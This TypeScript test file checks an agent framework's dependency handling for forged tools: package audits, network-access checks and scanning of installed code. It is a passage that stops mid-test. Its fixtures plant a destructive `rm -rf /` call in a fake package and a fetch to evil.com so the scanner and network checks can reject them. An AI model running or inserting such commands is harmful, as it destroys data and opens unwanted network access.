/**
 * E2E test — Brick dependency management through the full runtime.
 *
 * Validates the complete dependency management pipeline:
 *   1. forge_tool with `requires.packages` — packages field survives Zod parse + handler
 *   2. Verification pipeline: static → resolve → sandbox → self-test → trust (5 stages)
 *   3. Dependency audit gate rejects blocked transitive deps
 *   4. Workspace creation + bun install (env-gated, real I/O)
 *   5. Provenance records npm deps as resolvedDependencies
 *   6. ForgeRuntime resolves workspace path for brick with packages
 *   7. Network access validation — requires.network field enforcement
 *   8. Workspace code scanning — node_modules pattern detection
 *   9. Full L1 runtime: LLM calls forged tool with deps + network → result returned
 *  10. Network evasion pattern detection (Gap 1) — globalThis.fetch, aliasing, node: prefix
 *  11. maxTransitiveDependencies limit (Gap 3) — config-driven rejection
 *  12. Subprocess executor through L1 runtime (Gap 2) — process isolation + env isolation
 *
 * Gated on ANTHROPIC_API_KEY + E2E_TESTS=1 — tests skip when either is missing.
 *
 * Run:
 *   E2E_TESTS=1 ANTHROPIC_API_KEY=... bun test packages/forge/src/__tests__/e2e-deps.test.ts
 */

import { describe, expect, test } from "bun:test";
import type { AgentManifest, EngineEvent, EngineOutput, ModelRequest, Result } from "@koi/core";
import { toolToken } from "@koi/core";
import { createKoi } from "@koi/engine";
import { createLoopAdapter } from "@koi/engine-loop";
import { createAnthropicAdapter } from "@koi/model-router";
import type { DependencyConfig } from "../config.js";
import { createDefaultForgeConfig } from "../config.js";
import { auditDependencies, auditTransitiveDependencies } from "../dependency-audit.js";
import type { ForgeError } from "../errors.js";
import { createForgeComponentProvider } from "../forge-component-provider.js";
import { createForgeRuntime } from "../forge-runtime.js";
import { createInMemoryForgeStore } from "../memory-store.js";
import { createForgeToolTool } from "../tools/forge-tool.js";
import type { ForgeDeps } from "../tools/shared.js";
import type { ForgeResult, SandboxExecutor, TieredSandboxExecutor } from "../types.js";
import { verify } from "../verify.js";
import {
  computeDependencyHash,
  createBrickWorkspace,
  resolveWorkspacePath,
} from "../workspace-manager.js";
import { scanWorkspaceCode } from "../workspace-scan.js";

// ---------------------------------------------------------------------------
// Environment gate
// ---------------------------------------------------------------------------

const ANTHROPIC_KEY = process.env.ANTHROPIC_API_KEY ?? "";
const HAS_KEY = ANTHROPIC_KEY.length > 0;
const E2E_OPTED_IN = process.env.E2E_TESTS === "1";
const describeE2E = HAS_KEY && E2E_OPTED_IN ? describe : describe.skip;
// Full workspace I/O tests (bun install, real FS) — opt in separately
const WORKSPACE_E2E = process.env.WORKSPACE_INTEGRATION === "1";
const describeWorkspace = WORKSPACE_E2E ? describe : describe.skip;

const TIMEOUT_MS = 120_000;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function testManifest(): AgentManifest {
  return {
    name: "dep-e2e",
    version: "0.1.0",
    model: { name: "claude-haiku-4-5-20251001" },
  };
}

function createModelCall(): (req: ModelRequest) => Promise<import("@koi/core").ModelResponse> {
  const adapter = createAnthropicAdapter({ apiKey: ANTHROPIC_KEY });
  return (req) => adapter.complete({ ...req, model: "claude-haiku-4-5-20251001" });
}

async function collectEvents(
  iterable: AsyncIterable<EngineEvent>,
): Promise<readonly EngineEvent[]> {
  const events: EngineEvent[] = [];
  for await (const event of iterable) {
    events.push(event);
  }
  return events;
}

function findDoneOutput(events: readonly EngineEvent[]): EngineOutput | undefined {
  const done = events.find((e): e is EngineEvent & { readonly kind: "done" } => e.kind === "done");
  return done?.output;
}

/** Echo executor: returns input as-is. */
function mockExecutor(): SandboxExecutor {
  return {
    execute: async (_code, input, _timeout) => ({
      ok: true,
      value: { output: input, durationMs: 1 },
    }),
  };
}

/** Adder executor: evaluates input.a + input.b. */
function adderExecutor(): SandboxExecutor {
  return {
    execute: async (_code, input, _timeout) => {
      const obj = input as { readonly a: number; readonly b: number };
      return {
        ok: true,
        value: { output: { sum: obj.a + obj.b }, durationMs: 1 },
      };
    },
  };
}

function mockTiered(exec: SandboxExecutor): TieredSandboxExecutor {
  return {
    forTier: (tier) => ({
      executor: exec,
      requestedTier: tier,
      resolvedTier: tier,
      fallback: false,
    }),
  };
}

function defaultDeps(
  store: ReturnType<typeof createInMemoryForgeStore>,
  executor: SandboxExecutor,
  sessionForges = 0,
  configOverrides?: Partial<import("../config.js").ForgeConfig>,
): ForgeDeps {
  return {
    store,
    executor: mockTiered(executor),
    verifiers: [],
    config: createDefaultForgeConfig(configOverrides),
    context: {
      agentId: "dep-e2e-agent",
      depth: 0,
      sessionId: "dep-e2e-session",
      forgesThisSession: sessionForges,
    },
  };
}

const DEFAULT_DEP_CONFIG: DependencyConfig = {
  maxDependencies: 20,
  installTimeoutMs: 15_000,
  maxCacheSizeBytes: 1_073_741_824,
  maxWorkspaceAgeDays: 30,
  maxTransitiveDependencies: 200,
  maxBrickMemoryMb: 256,
  maxBrickPids: 32,
};

// ===========================================================================
// 1. forge_tool packages passthrough — no LLM needed
// ===========================================================================

describe("e2e-deps: forge_tool packages passthrough", () => {
  test("packages field survives Zod parse and reaches stored artifact", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "dep-tool",
      description: "A tool with npm deps",
      inputSchema: { type: "object" },
      implementation: "return input;",
      requires: {
        packages: { "is-number": "7.0.0", lodash: "4.17.21" },
      },
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    // Load from store — packages should be persisted
    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.requires?.packages).toEqual({
        "is-number": "7.0.0",
        lodash: "4.17.21",
      });
    }
  });

  test("packages field coexists with bins, env, tools in requires", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "mixed-reqs-tool",
      description: "A tool with all requires fields",
      inputSchema: { type: "object" },
      implementation: "return input;",
      requires: {
        bins: ["curl"],
        env: ["API_TOKEN"],
        tools: ["helper"],
        packages: { zod: "3.22.0" },
      },
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.requires?.bins).toEqual(["curl"]);
      expect(loaded.value.requires?.env).toEqual(["API_TOKEN"]);
      expect(loaded.value.requires?.tools).toEqual(["helper"]);
      expect(loaded.value.requires?.packages).toEqual({ zod: "3.22.0" });
    }
  });

  test("forged tool without packages still works (backward compat)", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "no-deps-tool",
      description: "A tool without packages",
      inputSchema: { type: "object" },
      implementation: "return input;",
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.requires?.packages).toBeUndefined();
    }
  });
});

// ===========================================================================
// 2. Verification pipeline — 5-stage flow with resolve
// ===========================================================================

describe("e2e-deps: verification pipeline stages", () => {
  test("pipeline runs 5 stages: static → resolve → sandbox → self_test → trust", async () => {
    const config = createDefaultForgeConfig();
    const input = {
      kind: "tool" as const,
      name: "verify-stages-tool",
      description: "Test tool for stage counting",
      inputSchema: { type: "object" as const },
      implementation: "return input;",
    };

    const result = await verify(
      input,
      { agentId: "a", depth: 0, sessionId: "s", forgesThisSession: 0 },
      mockExecutor(),
      [],
      config,
    );

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.stages).toHaveLength(6);
      const stageNames = result.value.stages.map((s) => s.stage);
      expect(stageNames).toEqual(["static", "format", "resolve", "sandbox", "self_test", "trust"]);
      expect(result.value.finalTrustTier).toBe("sandbox");
    }
  });

  test("resolve stage passes when no packages declared (skipped)", async () => {
    const config = createDefaultForgeConfig();
    const input = {
      kind: "tool" as const,
      name: "no-pkg-tool",
      description: "Tool without packages",
      inputSchema: { type: "object" as const },
      implementation: "return input;",
    };

    const result = await verify(
      input,
      { agentId: "a", depth: 0, sessionId: "s", forgesThisSession: 0 },
      mockExecutor(),
      [],
      config,
    );

    expect(result.ok).toBe(true);
    if (result.ok) {
      const resolveStage = result.value.stages.find((s) => s.stage === "resolve");
      expect(resolveStage).toBeDefined();
      expect(resolveStage?.passed).toBe(true);
    }
  });
});

// ===========================================================================
// 3. Dependency audit gate — direct + transitive
// ===========================================================================

describe("e2e-deps: audit gate", () => {
  test("rejects blocked direct dependency", () => {
    const config: DependencyConfig = { ...DEFAULT_DEP_CONFIG, blockedPackages: ["evil-pkg"] };
    const result = auditDependencies({ "evil-pkg": "1.0.0" }, config);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.message).toContain("blocked");
    }
  });

  test("rejects semver range (must be exact)", () => {
    const result = auditDependencies({ lodash: "^4.17.21" }, DEFAULT_DEP_CONFIG);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.message).toContain("exact semver");
    }
  });

  test("rejects blocked transitive dependency in lockfile", () => {
    const config: DependencyConfig = {
      ...DEFAULT_DEP_CONFIG,
      blockedPackages: ["evil-transitive"],
    };
    const lockContent = JSON.stringify({
      lockfileVersion: 1,
      workspaces: {},
      packages: {
        lodash: ["lodash@4.17.21"],
        "evil-transitive": ["evil-transitive@1.0.0"],
      },
    });
    const result = auditTransitiveDependencies(lockContent, config);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.message).toContain("Transitive dependency");
      expect(result.error.message).toContain("evil-transitive");
    }
  });

  test("passes when no transitive deps are blocked", () => {
    const config: DependencyConfig = { ...DEFAULT_DEP_CONFIG, blockedPackages: ["some-other-pkg"] };
    const lockContent = JSON.stringify({
      lockfileVersion: 1,
      workspaces: {},
      packages: {
        lodash: ["lodash@4.17.21"],
        zod: ["zod@3.22.0"],
      },
    });
    const result = auditTransitiveDependencies(lockContent, config);
    expect(result.ok).toBe(true);
  });
});

// ===========================================================================
// 4. Workspace creation (env-gated real I/O)
// ===========================================================================

describeWorkspace("e2e-deps: workspace creation (WORKSPACE_INTEGRATION=1)", () => {
  test(
    "createBrickWorkspace installs dependencies and creates node_modules",
    async () => {
      const packages = { "is-number": "7.0.0" };
      const tmpDir = `/tmp/koi-dep-e2e-${Date.now()}`;

      const result = await createBrickWorkspace(packages, DEFAULT_DEP_CONFIG, tmpDir);
      expect(result.ok).toBe(true);
      if (result.ok) {
        expect(result.value.cached).toBe(false);
        expect(result.value.workspacePath).toContain(tmpDir);

        // Verify node_modules exists
        const { stat } = await import("node:fs/promises");
        const nmStat = await stat(`${result.value.workspacePath}/node_modules`);
        expect(nmStat.isDirectory()).toBe(true);

        // Verify the package was installed
        const pkgStat = await stat(
          `${result.value.workspacePath}/node_modules/is-number/package.json`,
        );
        expect(pkgStat.isFile()).toBe(true);
      }

      // Cleanup
      const { rm } = await import("node:fs/promises");
      await rm(tmpDir, { recursive: true, force: true });
    },
    TIMEOUT_MS,
  );

  test(
    "second call hits cache (cached: true)",
    async () => {
      const packages = { "is-number": "7.0.0" };
      const tmpDir = `/tmp/koi-dep-e2e-cache-${Date.now()}`;

      // First call: fresh install
      const first = await createBrickWorkspace(packages, DEFAULT_DEP_CONFIG, tmpDir);
      expect(first.ok).toBe(true);
      if (first.ok) {
        expect(first.value.cached).toBe(false);
      }

      // Second call: should hit cache
      const second = await createBrickWorkspace(packages, DEFAULT_DEP_CONFIG, tmpDir);
      expect(second.ok).toBe(true);
      if (second.ok) {
        expect(second.value.cached).toBe(true);
      }

      const { rm } = await import("node:fs/promises");
      await rm(tmpDir, { recursive: true, force: true });
    },
    TIMEOUT_MS,
  );

  test("dependency hash is deterministic and order-independent", () => {
    const hash1 = computeDependencyHash({ b: "2.0.0", a: "1.0.0" });
    const hash2 = computeDependencyHash({ a: "1.0.0", b: "2.0.0" });
    expect(hash1).toBe(hash2);
    expect(hash1.length).toBeGreaterThan(0);
  });
});

// ===========================================================================
// 5. Provenance records npm deps
// ===========================================================================

describe("e2e-deps: provenance includes npm dependencies", () => {
  test("resolvedDependencies contains npm deps from requires.packages", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "prov-dep-tool",
      description: "Tool for provenance dep test",
      inputSchema: { type: "object" },
      implementation: "return input;",
      requires: {
        packages: { zod: "3.22.0", lodash: "4.17.21" },
      },
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      const { provenance } = loaded.value;
      const resolved = provenance.buildDefinition.resolvedDependencies;
      expect(resolved).toBeDefined();
      expect(resolved?.length).toBe(2);

      // Check the URIs follow npm: convention
      const uris = resolved?.map((d) => d.uri).sort();
      expect(uris).toEqual(["npm:lodash@4.17.21", "npm:zod@3.22.0"]);
    }
  });

  test("provenance has no resolvedDependencies when packages absent", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "no-prov-dep-tool",
      description: "Tool without package deps",
      inputSchema: { type: "object" },
      implementation: "return input;",
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      const resolved = loaded.value.provenance.buildDefinition.resolvedDependencies;
      // Should be undefined or empty — no packages declared
      expect(resolved === undefined || resolved.length === 0).toBe(true);
    }
  });
});

// ===========================================================================
// 6. ForgeRuntime workspace path resolution
// ===========================================================================

describe("e2e-deps: ForgeRuntime resolves workspace path", () => {
  test("resolveTool resolves tool with packages from store", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    // Forge a tool with packages
    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "runtime-dep-tool",
      description: "Tool for runtime resolution test",
      inputSchema: { type: "object" },
      implementation: "return input;",
      requires: {
        packages: { "is-number": "7.0.0" },
      },
    })) as { readonly ok: true; readonly value: ForgeResult };
    expect(result.ok).toBe(true);

    // ForgeRuntime should resolve the tool
    const forgeRuntime = createForgeRuntime({
      store,
      executor: mockTiered(executor),
    });

    const tool = await forgeRuntime.resolveTool("runtime-dep-tool");
    expect(tool).toBeDefined();
    expect(tool?.descriptor.name).toBe("runtime-dep-tool");

    forgeRuntime.dispose?.();
  });

  test("workspace path is deterministic based on dep hash", () => {
    const packages = { "is-number": "7.0.0", lodash: "4.17.21" };
    const hash = computeDependencyHash(packages);
    const path1 = resolveWorkspacePath(hash, "/tmp/test");
    const path2 = resolveWorkspacePath(hash, "/tmp/test");
    expect(path1).toBe(path2);
    expect(path1).toContain(hash);
  });
});

// ===========================================================================
// 7. Network access validation — requires.network field
// ===========================================================================

describe("e2e-deps: network access validation", () => {
  test("forge_tool rejects fetch() in implementation without requires.network", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "network-tool",
      description: "A tool that uses fetch",
      inputSchema: { type: "object" },
      implementation:
        'async function run(input: unknown) { const data = fetch("https://api.example.com"); return data; }',
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
      expect(result.error.message).toContain("requires.network");
    }
  });

  test("forge_tool allows fetch() when requires.network: true", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "network-allowed-tool",
      description: "A tool that uses fetch with permission",
      inputSchema: { type: "object" },
      implementation:
        'async function run(input: unknown) { const data = fetch("https://api.example.com"); return data; }',
      requires: { network: true },
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);

    // Verify network field persists in stored artifact
    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.requires?.network).toBe(true);
    }
  });

  test("network field survives full verification pipeline", async () => {
    const config = createDefaultForgeConfig();
    const input = {
      kind: "tool" as const,
      name: "net-pipeline-tool",
      description: "Tool with network for pipeline test",
      inputSchema: { type: "object" as const },
      implementation:
        'async function run(input: unknown) { const res = fetch("https://api.example.com"); return res; }',
      requires: { network: true },
    };

    const result = await verify(
      input,
      { agentId: "a", depth: 0, sessionId: "s", forgesThisSession: 0 },
      mockExecutor(),
      [],
      config,
    );

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.stages).toHaveLength(6);
      expect(result.value.passed).toBe(true);
    }
  });

  test("forge_tool rejects WebSocket without requires.network", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "ws-tool",
      description: "A tool using WebSocket",
      inputSchema: { type: "object" },
      implementation:
        'function connect() { const ws = new WebSocket("wss://example.com"); return ws; }',
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
    }
  });

  test("forge_tool rejects http import without requires.network", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "http-import-tool",
      description: "A tool importing http",
      inputSchema: { type: "object" },
      implementation:
        'import http from "http";\nexport function run() { return http.createServer(); }',
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
    }
  });

  test("forge_tool rejects Bun.serve() without requires.network", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "bun-serve-tool",
      description: "A tool using Bun.serve",
      inputSchema: { type: "object" },
      implementation:
        "export function run() { Bun.serve({ port: 3000, fetch(req: Request) { return new Response('ok'); } }); }",
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
    }
  });

  test("forge_tool rejects network API in companion files", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "file-network-tool",
      description: "A tool with network in companion file",
      inputSchema: { type: "object" },
      implementation: "export function run(input: unknown) { return input; }",
      files: {
        "lib/client.ts":
          'export async function callApi() { const data = fetch("https://evil.com"); return data; }',
      },
    })) as Result<ForgeResult, ForgeError>;

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("NETWORK_ACCESS_DENIED");
      expect(result.error.message).toContain("lib/client.ts");
    }
  });

  test("network + packages coexist in requires", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "net-pkg-tool",
      description: "Tool with both network and packages",
      inputSchema: { type: "object" },
      implementation:
        'async function run(input: unknown) { const res = fetch("https://api.example.com"); return res; }',
      requires: {
        network: true,
        packages: { zod: "3.22.0" },
        bins: ["curl"],
      },
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);
    const loaded = await store.load(result.value.id);
    expect(loaded.ok).toBe(true);
    if (loaded.ok) {
      expect(loaded.value.requires?.network).toBe(true);
      expect(loaded.value.requires?.packages).toEqual({ zod: "3.22.0" });
      expect(loaded.value.requires?.bins).toEqual(["curl"]);
    }
  });

  test("safe implementation passes without requires.network", async () => {
    const store = createInMemoryForgeStore();
    const executor = mockExecutor();
    const deps = defaultDeps(store, executor);

    const forgeTool = createForgeToolTool(deps);
    const result = (await forgeTool.execute({
      name: "safe-tool",
      description: "A safe tool without network access",
      inputSchema: { type: "object" },
      implementation: "export function run(input: unknown) { return { result: 42 }; }",
    })) as { readonly ok: true; readonly value: ForgeResult };

    expect(result.ok).toBe(true);
  });
});

// ===========================================================================
// 8. Workspace code scanning — node_modules pattern detection
// ===========================================================================

describe("e2e-deps: workspace code scanning", () => {
  test("scanWorkspaceCode passes for safe node_modules", async () => {
    const { mkdir, writeFile, rm } = await import("node:fs/promises");
    const tmpDir = `/tmp/koi-scan-e2e-safe-${Date.now()}`;
    await mkdir(`${tmpDir}/node_modules/safe-lib`, { recursive: true });
    await writeFile(
      `${tmpDir}/node_modules/safe-lib/index.js`,
      "module.exports = function add(a, b) { return a + b; };",
      "utf8",
    );

    const result = await scanWorkspaceCode(tmpDir, DEFAULT_DEP_CONFIG);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.findings.length).toBe(0);
      expect(result.value.scannedFiles).toBeGreaterThan(0);
    }

    await rm(tmpDir, { recursive: true, force: true });
  });

  test("scanWorkspaceCode rejects child_process usage", async () => {
    const { mkdir, writeFile, rm } = await import("node:fs/promises");
    const tmpDir = `/tmp/koi-scan-e2e-evil-${Date.now()}`;
    await mkdir(`${tmpDir}/node_modules/evil-lib`, { recursive: true });
    await writeFile(
      `${tmpDir}/node_modules/evil-lib/index.js`,
      'const cp = require("child_process");\ncp.exec("rm -rf /");',
      "utf8",
    );

    const result = await scanWorkspaceCode(tmpDir, DEFAULT_DEP_CONFIG);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("AUDIT_FAILED");
      expect(result.error.message).toContain("child_process");
    }

    await rm(tmpDir, { recursive: true, force: true });
  });

  test("scanWorkspaceCode returns warnings for eval() without blocking", async () => {
    const { mkdir, writeFile, rm } = await import("node:fs/promises");
    const tmpDir = `/tmp/koi-scan-e2e-warn-${Date.now()}`;
    await mkdir(`${tmpDir}/node_modules/template-lib`, { recursive: true });
    await writeFile(
      `${tmpDir}/node_modules/template-lib/index.js`,
      "module.exports = function run(code) { return eval(code); };",
      "utf8",
    );

    const result = await scanWorkspaceCode(tmpDir, DEFAULT_DEP_CONFIG);
    expect(result.ok).toBe(true);
    if (result.ok) {
      const evalFindings = result.value.findings.filter((f) => f.pattern === "eval()");
      expect(evalFindings.length).toBe(1);
      expect(evalFindings[0]?.severity).toBe("warning");
    }

    await rm(tmpDir, { recursive: true, force: true });
  });

  test("scanWorkspaceCode handles missing node_modules gracefully", async () => {
    const { mkdir, rm } = await import("node:fs/promises");
    const tmpDir = `/tmp/koi-scan-e2e-empty-${Date.now()}`;
    await mkdir(tmpDir, { recursive: true });

    const result = await scanWorkspaceCode(tmpDir, DEFAULT_DEP_CONFIG);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.scannedFiles).toBe(0);
    }

    await rm(tmpDir, { recursive: true, force: true });
  });
});

// ===========================================================================
// 9. Full L1 runtime: LLM calls forged tool with deps (real API call)
// ===========================================================================

describeE2E("e2e-deps: full L1 runtime with LLM + forge + deps + network", () => {
  test(
    "forged tool with packages is callable by LLM through createKoi",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = adderExecutor();
      const deps = defaultDeps(store, executor);

      // Step 1: Forge a tool with npm package deps
      const forgeTool = createForgeToolTool(deps);
      const forgeResult = (await forgeTool.execute({
        name: "dep-adder",
        description:
          "Adds two numbers. Call with {a: number, b: number}. Returns {sum: number}. " +
          "Requires is-number npm package.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation: "return { sum: input.a + input.b };",
        requires: {
          packages: { "is-number": "7.0.0" },
        },
      })) as { readonly ok: true; readonly value: ForgeResult };
      expect(forgeResult.ok).toBe(true);

      // Verify artifact has packages
      const loaded = await store.load(forgeResult.value.id);
      expect(loaded.ok).toBe(true);
      if (loaded.ok) {
        expect(loaded.value.requires?.packages).toEqual({ "is-number": "7.0.0" });
      }

      // Step 2: Create ForgeComponentProvider
      const forgeProvider = createForgeComponentProvider({
        store,
        executor: mockTiered(executor),
      });

      // Step 3: Full L1 runtime with real LLM
      const modelCall = createModelCall();
      const loopAdapter = createLoopAdapter({ modelCall, maxTurns: 3 });

      const runtime = await createKoi({
        manifest: testManifest(),
        adapter: loopAdapter,
        providers: [forgeProvider],
        loopDetection: false,
      });

      // Step 4: Ask LLM to use the tool
      const events = await collectEvents(
        runtime.run({
          kind: "text",
          text: "Use the dep-adder tool to add 42 and 58. Return the result.",
        }),
      );
      await runtime.dispose();

      // Step 5: Assertions
      const output = findDoneOutput(events);
      expect(output).toBeDefined();
      expect(output?.stopReason === "completed" || output?.stopReason === "max_turns").toBe(true);

      // The forged tool should be attached
      const toolComponent = runtime.agent.component(toolToken("dep-adder"));
      expect(toolComponent).toBeDefined();

      // Token metrics should be populated
      if (output !== undefined) {
        expect(output.metrics.inputTokens).toBeGreaterThan(0);
        expect(output.metrics.outputTokens).toBeGreaterThan(0);
      }
    },
    TIMEOUT_MS,
  );

  test(
    "forged tool with ForgeRuntime hot-attach and packages",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = adderExecutor();
      const deps = defaultDeps(store, executor);

      // Forge a tool with packages before runtime creation
      const forgeTool = createForgeToolTool(deps);
      const forgeResult = (await forgeTool.execute({
        name: "hot-dep-tool",
        description:
          "Multiplies two numbers. Call with {a: number, b: number}. Returns {product: number}.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation: "return { product: input.a * input.b };",
        requires: {
          packages: { zod: "3.22.0" },
        },
      })) as { readonly ok: true; readonly value: ForgeResult };
      expect(forgeResult.ok).toBe(true);

      // ForgeRuntime for hot-attach
      const forgeRuntime = createForgeRuntime({
        store,
        executor: mockTiered(executor),
      });

      // Full L1 runtime with ForgeRuntime hot-attach
      const modelCall = createModelCall();
      const loopAdapter = createLoopAdapter({ modelCall, maxTurns: 3 });

      const runtime = await createKoi({
        manifest: testManifest(),
        adapter: loopAdapter,
        forge: forgeRuntime,
        loopDetection: false,
      });

      const events = await collectEvents(
        runtime.run({
          kind: "text",
          text: "Use the hot-dep-tool to multiply 6 and 7. Return the result.",
        }),
      );
      await runtime.dispose();
      forgeRuntime.dispose?.();

      const output = findDoneOutput(events);
      expect(output).toBeDefined();
      expect(output?.stopReason === "completed" || output?.stopReason === "max_turns").toBe(true);
    },
    TIMEOUT_MS,
  );

  test(
    "forged tool with blocked package is rejected by audit gate",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = mockExecutor();
      const deps = defaultDeps(store, executor, 0, {
        dependencies: {
          ...DEFAULT_DEP_CONFIG,
          blockedPackages: ["malicious-pkg"],
        },
      });

      const forgeTool = createForgeToolTool(deps);
      const result = (await forgeTool.execute({
        name: "blocked-dep-tool",
        description: "Tool with blocked dep",
        inputSchema: { type: "object" },
        implementation: "return input;",
        requires: {
          packages: { "malicious-pkg": "1.0.0" },
        },
      })) as Result<ForgeResult, ForgeError>;

      // Should fail — blocked package
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.message).toContain("blocked");
      }
    },
    TIMEOUT_MS,
  );

  test(
    "end-to-end: forge → store → provenance → runtime → LLM call (integration)",
    async () => {
      const store = createInMemoryForgeStore();
      const executor = adderExecutor();
      const deps = defaultDeps(store, executor);

      // 1. Forge with packages
      const forgeTool = createForgeToolTool(deps);
      const forgeResult = (await forgeTool.execute({
        name: "full-pipeline-tool",
        description:
          "Adds two numbers. Call with {a: number, b: number}. Returns {sum: number}. Full pipeline test.",
        inputSchema: {
          type: "object",
          properties: { a: { type: "number" }, b: { type: "number" } },
          required: ["a", "b"],
        },
        implementation: "return { sum: input.a + input.b };",
        requires: {
          packages: { "is-number": "7.0.0" },
        },
        classification: "internal",
      })) as { readonly ok: true; readonly value: ForgeResult };
      expect(forgeResult.ok).toBe(true);

      // 2. Verify artifact integrity
      const loaded = await store.load(forgeResult.value.id);
      expect(loaded.ok).toBe(true);
      if (!loaded.ok) return;

      const brick = loaded.value;
      expect(brick.id).toMatch(/^sha256:[0-9a-f]{64}$/);
      expect(brick.requires?.packages).toEqual({ "is-number": "7.0.0" });
      expect(brick.provenance.classification).toBe("internal");
      expect(brick.provenance.buildDefinition.resolvedDependencies?.length).toBe(1);
      expect(brick.provenance.buildDefinition.resolvedDependencies?.[0]?.uri).toBe(
        "npm:is-number@7.0.0",
      );

      // 3. ForgeRuntime resolves the tool
      const forgeRuntime = createForgeRuntime({
        store,
        executor: mockTiered(executor),
      });
      const resolved = await forgeRuntime.resolveTool("full-pipeline-tool");
      expect(resolved).toBeDefined();
      forgeRuntime.dispose?.();

      // 4. Full L1 runtime with real LLM
      const forgeProvider = createForgeComponentProvider({
        store,
        executor: mockTiered(executor),
      });
      const modelCall = createModelCall();
      const loopAdapter = createLoopAdapter({ modelCall, maxTurns: 3 });

      const runtime = await createKoi({
        manifest: testManifest(),
        adapter: loopAdapter,
        providers: [forgeProvider],
        loopDetection: false,
      });

      const events = await collectEvents(
        runtime.run({
          kind: "text",
          text: "Use the full-pipeline-tool to add 99 and 1. Return the result.",
        }),
      );
      await runtime.dispose();

      const output = findDoneOutput(events);
      expect(output).toBeDefined();
